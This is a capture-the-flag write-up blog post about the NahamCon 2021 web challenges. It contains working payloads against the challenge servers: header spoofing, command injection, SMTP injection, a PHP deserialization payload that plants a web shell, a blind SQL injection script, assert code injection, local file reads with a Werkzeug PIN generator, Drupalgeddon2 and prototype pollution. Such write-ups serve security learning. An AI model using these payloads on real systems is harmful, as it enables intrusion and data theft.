---
title: "Writeup Nahamcon 2021 CTF - Web Challenges"
date: 2021-03-15 01:38:00 +0000
modified: 2021-03-15
description: "Writeup Nahamcon 2021"
comments: true
tags:
- nahamcon2021
mathjax: false
category:
- Ctf
private: false
---

![images/nahamcon21/nahamcon.png](../images/nahamcon21/nahamcon.png)

I was playing the Nahamcon 2021 Capture The Flag with my team `AmpunBangJago` we're finished at 4th place from 6491 Teams around the world and that was an achievment for me.

Well me and my team was able to solve all the web challenges on the CTF, my focus was Web Exploitation so on this blog I will only write about all the Web Challenges that i solved.

![images/nahamcon21/latest-score.png](../images/nahamcon21/latest-score.png)




# [Easy] Homeward Bound - 50 points (686 Solves)

### Intro
```
Author: @JohnHammond#6971

I can't get anything out of this website... can you find anything interesting?

NOTE: That message is intended. This challenge is working as it should.
```

### Solve

The page was showing an error `Sorry, this page is not accessible externally.` we can guess that the page is somehow expecting an internal ip address to send a request to this page and we can solve it by spoofing the ip using the famous `X-Forwarded-For` header 😊

Look at this curl command below:

```
✗ curl -H "X-Forwarded-For: 127.0.0.1" http://challenge.nahamcon.com:30903/ | grep flag
<div class="alert alert-success" role="alert"><b>Welcome!</b> Your internal access key is: <code>flag{26080a2216e95746ec3e932002b9baa4}</code></div>                    </p>
```                    
---
# [Easy] $Echo - 50 points (746 Solves)

### Intro

```
Author: @Blacknote#1337

So I just made a hardcoded bot that basically tells you what you wanna hear. Now usually it's a $ for each thing you want it to say but I'll waive the fee for you if you beta test it for me.
```

### Solve

The web application seems vulnerable to remote command execution, since our input is passed into the part of executed command without any sanitation before, but there is a blacklisting character to prevent the attack but still not enought.


```
php
<?php echo basename($_SERVER['PHP_SELF']); ?>"> <input type="text" name="echo" id="echo" size="80"> <input type="submit" value="Echo"> </form> <h3> <?php $to_echo = $_REQUEST['echo'];
$cmd = "bash -c 'echo " . $to_echo . "'";
if (isset($to_echo))
{
    if ($to_echo == "")
    {
        print "Please don't be lame, I can't just say nothing.";
    }
    elseif (preg_match('/[#!@%^&*()$_+=\-\[\]\';,{}|":>?~\\\\]/', $to_echo))
    {
        print "Hey mate, you seem to be using some characters that makes me wanna throw it back in your face >:(";
    }
    elseif ($to_echo == "cat")
    {
        print "Meowwww... Well you asked for a cat didn't you? That's the best impression you're gonna get :/";
    }
    elseif (strlen($to_echo) > 15)
    {
        print "Man that's a mouthful to echo, what even?";
    }
    else
    {
        system($cmd);
    }
}
else
{
    print "Alright, what would you have me say?";
} ?>
```

The attack is still posibble by using backtick as the alias for `shell_Exec` in php, and we can get the flag by using this payload `<../flag.txt` the flag `flag{1beadaf44586ea4aba2ea9a00c5b6d91}`

---
# [Medium] Imposter - 492 points (71 Solves)

### Intro

```
Author: @congon4tor#2334

Are you who you say you are? How can you be not?
```

### Solve

The web application have a register,login,secret(create,delete,view),forgot pass and each user is enabled otp by default to login, but the OTP secret only encoded using base32 and is using static key and format like `<username>123456789`

we can construct this url to generate admin otp
`otpauth://totp/2Password:admin?secret=MFSG22LOGEZDGNBVGY3TQOI%3D&issuer=2Password`

The function of forgot pass is vulnerable to SMTP Injection, so we can add our email before the victim email and we both the forgot password email, the payload used below:

```
POST /reset-pass HTTP/1.1
..snip..

{"username":"admin","email":"hacker@gmail.com\nadmin@gmail.com"}
```

After reset the admin password and have the admin otp, just login and fetch the flag like a boss 😎😎

---
# [Medium] Cereal and Milk - 491 points (74 Solves)

### Intro

```
Author: @NightWolf#0268

What do you like for breakfast? Cereal and milk is my favorite.
Sometimes, it tastes a bit odd though.
```

### Solve

This challenge is straigth forward we're given the source code of the apps.

- index.php

```
<?php

include 'log.php';

class CerealAndMilk
{
    public $logs = "request-logs.txt";
    public $request = '';
    public $cereal = 'Captain Crunch';
    public $milk = '';
    

    public function processed_data($output)
    {
        echo "Deserilized data:<br> Coming soon.";
       # echo print_r($output);
        
    }

    public function cereal_and_milk()
    {
     echo $this->cereal . " is the best cereal btw.";   
    }

}

$input = $_POST['serdata'];
$output = unserialize($input);

$app = new CerealAndMilk;
$app -> cereal_and_milk($output);



?>
```

- log.php

```
<?php

class log
{
    public function __destruct()
        {
            $request_log = fopen($this->logs , "a");
            fwrite($request_log, $this->request);
            fwrite($request_log, "\r\n");
            fclose($request_log);
        }
}

?>
```

by reading the code we understand that our input is unserialized by the application, and we just control the log filename`($logs)` we want and the content`($request)` by using this serialize payload below:

![../images/nahamcon21/php-doctor.jpg](../images/nahamcon21/php-doctor.jpg)

```
O:3:"log":4:{s:4:"logs";s:16:"yerabajigur5.php";s:7:"request";s:28:"<?php $_GET[1]($_GET[2]); ?>";s:6:"cereal";s:5:"XXXXX";s:4:"milk";s:2:"AA"}
```

Found the flag here http://challenge.nahamcon.com:31745/ndwbr7pVKNCrhs-CerealnMilk/flag.txt

`flag{70385676892a2a813a666961ddd6f899}`

---
# [Medium] Bad Blog - 469 points (122 Solves)

### Intro

```
Author: @congon4tor#2334

We just added analytics to our blogging website. Check them out!
```

### Solve

The developer logging every user information of `User-Agent` when the user is reading a blog post, and the `User-Agent` is vulnerable to SQL Injection, to fully exploiting this I made python scripts to make my life easier 🙌

```
import requests
import re
import os
from bs4 import BeautifulSoup
session = requests.session()

url = "http://challenge.nahamcon.com:30790/post/xxx"

headers = {
"Cache-Control": "max-age=0", 
"Origin": "http://challenge.nahamcon.com:30790", 
"Upgrade-Insecure-Requests": "1", 
"User-Agent": "Mozilla' AND (SELECT hex(substr({},{},1)) {})<=hex(char({})) AND '1'='1",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 
"Accept-Language": "en-US,en;q=0.9,de;q=0.8,es;q=0.7,id;q=0.6,ms;q=0.5", 
"Connection": "close",
"Cookie": "authtoken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFjYWIifQ.vJxGky4BNE4jUeFLIr9Fp7pQHxG-YhE6fJHRAJCoY7o"
}

pyld = "Mozilla' OR (SELECT hex(substr({},{},1)) {})<=hex(char({})) AND '1'='1"
def check(data):
	return re.search("Satu kaki", data)

def blind(kolom,table):
    passwd = ""
    idx = 1

    while (True):
        lo = 1
        hi = 255
        temp = -1
        while(lo <= hi):
            mid = (lo + hi) / 2
            headers["User-Agent"]=pyld.format(str(kolom),str(idx),str(table),int(mid))
            # print(headers)
            res = requests.get(url,headers=headers)
            
            res = requests.get('http://challenge.nahamcon.com:30790/profile',headers=headers)
            # print(res.text)
            bs=BeautifulSoup(res.text, "lxml")
            tbl = bs.find("table")
            last_row = tbl("tr")[-1]("td")[-1].get_text()
            # print(last_row)

            if last_row=='1':
               hi = mid-1
               temp = mid
            else:
               lo = mid+1
               
        if (hi == 0): break
        passwd += chr(int(temp))
        print("Result [{}]: {}".format(table,passwd))
        idx += 1

    return passwd
   

# blind("tbl_name","FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'")
# blind("group_concat(sql)","FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='user'")
# Result [FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='user']: CREATE TABLE user (
#         id INTEGER NOT NULL,
#         username VARCHAR(40),
#         password VARCHAR(40),
#         PRIMARY
# blind("group_concat(ua)","FROM visit where post_id=4")
blind("group_concat(password)","FROM user where username='admin'")


```

This script help me to perform the SQL Injection with boolean check every time the injection fired, and using binary search algorithm to make the search efficient, at the end of the day Found the password of admin account and just login to get the flag.

---
# [Medium] Asserted - 301 points (283 Solves)

### Intro

```
Author: dead#4282 & @JohnHammond#6971

Time to hit the gym! Assert all your energy! Err, wait, is the saying "exert" all your energy? I don't know...

The flag is in /flag.txt.
```
### Solve

The website was Vulnerable to Local File Inclusion, iwas able to read the source code of the application and found out that they we're using assert function to check if the str of `$file` contains .., well we can abuse this since we control part of the `$file` we can escape the strpos can execute any function that we want.

```
http://challenge.nahamcon.com:31066/index.php?page=php://filter/convert.base64-encode/resource=index

<?php

if (isset($_GET['page'])) {
  $page = $_GET['page'];
  $file = $page . ".php";

  // Saving ourselves from any kind of hackings and all
  assert("strpos('$file', '..') === false") or die("HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE");
  
} else {
  $file = "home.php";
}

include($file);

?>

```

By using `passthru` I was able to get output of the flag.

```
http://challenge.nahamcon.com:31066/index.php?page=%27,%27a%27)===false%20%26%26passthru(%27cat%20../../../../flag.txt%27)%26%26%20strpos(%27abc

flag{85a25711fa6e111ed54b86468a45b90c}
```

---
# [Hard] Workerbee - 500 points (19 Solves)

### Intro

```
Author: @JohnHammond#6971

Check out our new service, Workerbee. It is super secure. I promise.

Escalate your privileges and find the flag.
```
### Solve

The application is expecting an https website but was using broken regex check, so we can exploit it to read local files.

`file:///etc/passwd#https://`

Since the werkezeug debugger is enabled, we can generate the PIN(used by werkzeug) based on gathering all the information from the system.

```
Mac-Addr => http://challenge.nahamcon.com:31919/?destination=file:///sys/class/net/eth0/address%23https://xx
Machine-id => http://challenge.nahamcon.com:31919/?destination=file:////proc/sys/kernel/random/boot_id%23https://xx
Cgroup => http://challenge.nahamcon.com:31919/?destination=file:////proc/self/cgroup%23https://xx
```

After gathering all the info we can just generate the pin number by our self
```
import hashlib 
from itertools import chain
import os
import getpass
from _compat import text_type

pin = None
rv = None
num = None

probably_public_bits = [ 
  'workerbee' , # username 
  'flask.app' , # modname Always the same 
  'Flask' , # Always the same
  '/usr/local/lib/python3.8/dist-packages/flask/app.py'
  ]
def _generate():
    linux = b""

    for filename in "./machine-id.txt", "./boot-id.txt":
        try:
            with open(filename, "rb") as f:
                value = f.readline().strip()
        except IOError:
            continue

        if value:
            linux += value
            break
    try:
        with open("./cgroup.txt", "rb") as f:
            linux += f.readline().strip().rpartition(b"/")[2]
            print(linux)
    except IOError:
        pass

    if linux:
        return(linux)
private_bits = ["200131488130819", _generate()]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)

h.update(b"cookiesalt")

cookie_name = "__wzd" + h.hexdigest()[:20]

if num is None:
    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
        else:
            rv = num
print(rv)

```

And surfing inside the werkezeug console to get flag :))


---
# [Hard] Borg - 499 points (21 Solves)

### Intro
```
Author: @magnologan#3840

This is an easy one for you. What do you know about Borg? I mean outside of Star Trek, of course.

The answer to this challenge is classified somewhere inside this Borg machine.

"Computers make excellent and efficient servants, but I have no wish to serve under them." - Mr. Spock, "The Ultimate Computer"

Use the URL provided to start this challenge. And boldly go!

Connect here: http://a20f22f911d2c4c899badfa27913cc51-1960241099.us-east-1.elb.amazonaws.com/
```
### Solve

Exploiting using https://github.com/dreadlocked/Drupalgeddon2

![Drupalgeddon](../images/nahamcon21/drupalgedon.png)

The flag hiding in kube 🐱‍👤

```
cd /tmp

curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

./kubectl get secret -n kube-system ctf -o yaml

apiVersion: v1
data:
  flag: ZmxhZ3s0MTFfeW91cl9jMXU1K2VyNV82ZTFvbjlfK29fbWV9Cg==
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","data":{"flag":"ZmxhZ3s0MTFfeW91cl9jMXU1K2VyNV82ZTFvbjlfK29fbWV9Cg=="},"kind":"Secret","metadata":{"annotations":{},"name":"ctf","namespace":"kube-system"},"type":"Opaque"}
  creationTimestamp: "2021-03-14T12:24:09Z"
  managedFields:
  - apiVersion: v1
    fieldsType: FieldsV1
    fieldsV1:
      f:data:
        .: {}
        f:flag: {}
      f:metadata:
        f:annotations:
          .: {}
          f:kubectl.kubernetes.io/last-applied-configuration: {}
      f:type: {}
    manager: kubectl
    operation: Update
    time: "2021-03-14T12:24:09Z"
  name: ctf
  namespace: kube-system
  resourceVersion: "896473"
  selfLink: /api/v1/namespaces/kube-system/secrets/ctf
  uid: 1c854794-b689-4c82-9d0f-9133a13d64a3
type: Opaque


❯ echo ZmxhZ3s0MTFfeW91cl9jMXU1K2VyNV82ZTFvbjlfK29fbWV9Cg==| base64 -d
flag{411_your_c1u5+er56e1on9+o_me}
```
---
# [Hard] Fight Club - 500 points (6 Solves)

### Intro

```
Author: @Blacknote#1337

This is Stage 5 of Path 5 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.

We found a random website in the CONSTELLATIONS network. It's all about... Fight Club??? Note: Flag can be found in /
```

### Solve

The website is simple, only expecting a name and reflecting the name back.

Back of my mind i was just thinking about that hidden LFR on express js which was quite new released by CaptainFreak, if you wanted to know more about how this could happen please check this blog post [The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/).

Trying the LFR flawlessly working, and just read the flag in the root dir after that.

![Nahamcon](../images/nahamcon21/lfr.png)

---
# [Hard] Dirty Bird - 500 points (3 Solves)

### Intro

```
Author: @congon4tor#2334

This is Stage 5 of Path 3 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.

Orion found this new online sharing service... do you have an opinion? Yeah, everyone on the internet has one...
```

### Solve

The website is like a simple version of a twitter, we all got stuck no where until the problem setter update the challenges and add package.json in the website.

Instantly trying to exploit the prototype pollution after looking the vulnerable version of lodash used from `package.json` file.

Thinking about Remote Code Execution(RCE) by abusing the `prototype pollution` and the `pug` but got us nowhere, 
by the power of `hacker sense`,we just need to pollute the `isAdmin` variable that validate if the user is admin or not, the `isAdmin` is known  at the JsonWebToken(JWT) session.

```
POST /tweet HTTP/1.1
..snip..

{"abcdefghijklmn":{"__proto__":{"isAdmin":1}}}
```

![Dirty Bird](../images/nahamcon21/dirtybird.png)

